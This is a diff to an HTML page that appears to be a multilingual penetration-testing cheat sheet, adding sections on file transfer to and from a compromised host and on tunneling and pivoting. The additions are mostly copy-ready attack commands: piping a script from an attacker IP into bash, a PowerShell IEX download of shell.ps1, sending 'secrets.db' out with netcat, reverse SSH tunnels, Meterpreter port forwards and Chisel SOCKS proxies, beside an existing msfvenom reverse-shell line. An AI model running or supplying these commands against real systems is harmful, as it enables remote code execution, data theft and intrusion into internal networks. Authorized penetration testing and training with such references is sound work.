@@ -636,6 +636,75 @@ ffuf -u https://example.com/FUZZ -w /wordlist.txt -o ffuf.json -of json</code></
             <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f c</code></pre>
         </div>
     </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section19Title" data-target="section-19">
+            19) File Transfer (In-Memory & On-Disk)
+            <span class="chip-container">
+                <span class="chip">Payload</span>
+                <span class="chip">Exfil</span>
+            </span>
+            <span class="toggle-icon" data-expanded="🔓" data-collapsed="🔒">🔒</span>
+        </h2>
+        <p class="section-desc" data-i18n="section19Desc">Common methods to transfer files to and from a compromised host (Linux/Windows).</p>
+        <div id="section-19" class="section-content">
+            <p class="command-desc" data-i18n="section19CommandDesc">Essential techniques using native binaries (curl, wget) and common languages (Python, Netcat).</p>
+
+            <p class="command-desc"># Attacker: Python HTTP Server (Serving files)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>python3 -m http.server 8000</code></pre>
+
+            <p class="command-desc">Target (Linux): Download file via wget (Attacker IP: 10.0.0.5)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>wget http://10.0.0.5:8000/tool.sh</code></pre>
+
+            <p class="command-desc">Target (Linux): Download file via curl (In-Memory execution, safer)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>curl http://10.0.0.5:8000/script.sh | bash</code></pre>
+
+            <p class="command-desc">Attacker: Netcat Listener (Receive file: 'data.txt' from target)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nc -l -p 8888 > received_data.txt</code></pre>
+
+            <p class="command-desc">Target: Netcat Transfer (Send file: 'secrets.db' to Attacker IP: 10.0.0.5)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nc 10.0.0.5 8888 < secrets.db</code></pre>
+
+            <p class="command-desc">Target (Windows): Download file via PowerShell (IEX)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5:8000/shell.ps1')</code></pre>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section20Title" data-target="section-20">
+            20) Tunneling & Pivoting
+            <span class="chip-container">
+                <span class="chip">Network</span>
+                <span class="chip">Pivot</span>
+            </span>
+            <span class="toggle-icon" data-expanded="🔓" data-collapsed="🔒">🔒</span>
+        </h2>
+        <p class="section-desc" data-i18n="section20Desc">Establishing network access to otherwise unreachable internal networks from a compromised host (pivoting).</p>
+        <div id="section-20" class="section-content">
+            <p class="command-desc" data-i18n="section20CommandDesc">Utilizing SSH, Meterpreter, and native tools to create port forwards and SOCKS proxies.</p>
+            
+            <p class="command-desc"># Local SSH Port Forward (Tunnel local port to remote target)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>ssh -L 8080:192.168.1.10:80 user@jumpbox.corp</code></pre>
+
+            <p class="command-desc">Reverse SSH Tunnel (Target connects back to attacker to create a forward)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>ssh -R 9000:127.0.0.1:80 user@10.0.0.5</code></pre>
+
+            <p class="command-desc">Metasploit Portfwd (Meterpreter session: tunnel target-side port to local)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>portfwd add -l 3389 -r 192.168.1.15 -p 3389</code></pre>
+
+            <p class="command-desc">SOCKS Proxy via Metasploit (Enable proxy via a Meterpreter session)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>use auxiliary/server/socks_proxy
+set SRVHOST 0.0.0.0
+set SRVPORT 1080
+run</code></pre>
+
+            <p class="command-desc">Chisel (Attacker: SOCKS server)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>./chisel server -p 8000 --socks5</code></pre>
+            
+            <p class="command-desc">Chisel (Target: Connect to server and create tunnel)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>./chisel client 10.0.0.5:8000 R:1080:socks</code></pre>
+        </div>
+    </div>
 
 
     <footer>
@@ -744,10 +813,20 @@ ffuf -u https://example.com/FUZZ -w /wordlist.txt -o ffuf.json -of json</code></
         "section17Desc": { "en": "Ensuring safe, reproducible testing environments and comprehensive logging.", "ru": "Обеспечение безопасных, воспроизводимых сред тестирования и комплексного ведения журнала.", "he": "הבטחת סביבות בדיקה בטוחות וניתנות לשחזור ורישום לוגים מקיף.", "fr": "Assurer des environnements de test sûrs et reproductibles et une journalisation complète.", "de": "Gewährleistung sicherer, reproduzierbarer Testumgebungen und umfassender Protokollierung." },
         "section17CommandDesc": { "en": "Techniques to minimize risk via Docker isolation and ensure detailed test outcome logging.", "ru": "Методы минимизации риска с помощью изоляции Docker и обеспечения подробного протоколирования результатов тестирования.", "he": "טכניקות למזעור סיכונים באמצעות בידוד Docker והבטחת רישום מפורט של תוצאות הבדיקה.", "fr": "Techniques pour minimiser les risques via l'isolation Docker et garantir la journalisation détaillée des résultats des tests.", "de": "Techniken zur Minimierung des Risikos durch Docker-Isolation und zur Gewährleistung einer detaillierten Protokollierung der Testergebnisse." },
         
-        // NEW SECTION 18: Evasion & msfvenom Payloads
+        // SECTION 18: Evasion & msfvenom Payloads
         "section18Title": {"en": "18) Evasion & msfvenom Payloads", "ru": "18) Обход и полезные нагрузки msfvenom", "he": "18) התחמקות ומטעני msfvenom", "fr": "18) Évasion et Payloads msfvenom", "de": "18) Evasion & msfvenom Payloads"},
         "section18Desc": {"en": "Generating and encoding reverse shell payloads. **AUTHORIZED USE ONLY.**", "ru": "Генерация и кодирование полезных нагрузок обратной оболочки. **ТОЛЬКО С РАЗРЕШЕНИЯ.**", "he": "יצירה וקידוד של מטעני מעטפת הפוכה. **שימוש מורשה בלבד.**", "fr": "Génération et encodage de payloads de reverse shell. **UTILISATION AUTORISÉE UNIQUEMENT.**", "de": "Generierung und Kodierung von Reverse-Shell-Payloads. **NUR FÜR AUTORISIERTE NUTZUNG.**"},
         "section18CommandDesc": {"en": "Use the '-e' flag for evasion (encoding) and the '-f' flag for different output formats.", "ru": "Используйте флаг '-e' для обхода (кодирования) и флаг '-f' для различных форматов вывода.", "he": "השתמש בדגל '-e' להתחמקות (קידוד) ובדגל '-f' לפורמטי פלט שונים.", "fr": "Utilisez le drapeau '-e' pour l'évasion (encodage) et le drapeau '-f' pour différents formats de sortie.", "de": "Verwenden Sie das Flag '-e' für Evasion (Kodierung) und das Flag '-f' für verschiedene Ausgabeformate."},
+        
+        // NEW SECTION 19: File Transfer
+        "section19Title": {"en": "19) File Transfer (In-Memory & On-Disk)", "ru": "19) Передача файлов (в памяти и на диск)", "he": "19) העברת קבצים (בזיכרון ועל דיסק)", "fr": "19) Transfert de Fichiers (Mémoire & Disque)", "de": "19) Dateiübertragung (In-Memory & On-Disk)"},
+        "section19Desc": {"en": "Common methods to transfer files to and from a compromised host (Linux/Windows).", "ru": "Общие методы передачи файлов на скомпрометированный хост и обратно (Linux/Windows).", "he": "שיטות נפוצות להעברת קבצים אל ומאתר מארח שנפרץ (לינוקס/חלונות).", "fr": "Méthodes courantes pour transférer des fichiers vers et depuis un hôte compromis (Linux/Windows).", "de": "Gängige Methoden zur Dateiübertragung von und zu einem kompromittierten Host (Linux/Windows)."},
+        "section19CommandDesc": {"en": "Essential techniques using native binaries (curl, wget) and common languages (Python, Netcat).", "ru": "Основные методы с использованием нативных бинарных файлов (curl, wget) и распространенных языков (Python, Netcat).", "he": "טכניקות חיוניות המשתמשות בבינאריות מקוריות (curl, wget) ושפות נפוצות (Python, Netcat).", "fr": "Techniques essentielles utilisant des binaires natifs (curl, wget) et des langages courants (Python, Netcat).", "de": "Wesentliche Techniken unter Verwendung nativer Binärdateien (curl, wget) und gängiger Sprachen (Python, Netcat)."},
+
+        // NEW SECTION 20: Tunneling & Pivoting
+        "section20Title": {"en": "20) Tunneling & Pivoting", "ru": "20) Туннелирование и пивотинг", "he": "20) יצירת מנהרות ופיבוטינג", "fr": "20) Tunneling et Pivoting", "de": "20) Tunneling & Pivoting"},
+        "section20Desc": {"en": "Establishing network access to otherwise unreachable internal networks from a compromised host (pivoting).", "ru": "Установление сетевого доступа к недоступным внутренним сетям со скомпрометированного хоста (пивотинг).", "he": "יצירת גישת רשת לרשתות פנימיות שלא היו נגישות אחרת מתוך מארח שנפרץ (פיבוטינג).", "fr": "Établissement d'un accès réseau à des réseaux internes autrement inaccessibles depuis un hôte compromis (pivoting).", "de": "Einrichtung eines Netzwerkzugriffs auf ansonsten unerreichbare interne Netzwerke von einem kompromittierten Host (Pivoting)."},
+        "section20CommandDesc": {"en": "Utilizing SSH, Meterpreter, and native tools to create port forwards and SOCKS proxies.", "ru": "Использование SSH, Meterpreter и нативных инструментов для создания переадресации портов и прокси SOCKS.", "he": "שימוש ב-SSH, Meterpreter וכלים מקוריים ליצירת העברת פורטים ופרוקסי SOCKS.", "fr": "Utilisation de SSH, Meterpreter et d'outils natifs pour créer des redirections de ports et des proxys SOCKS.", "de": "Nutzung von SSH, Meterpreter und nativen Tools zur Erstellung von Port-Forwards und SOCKS-Proxies."},
     };
 
     // Global state for collapse tracking
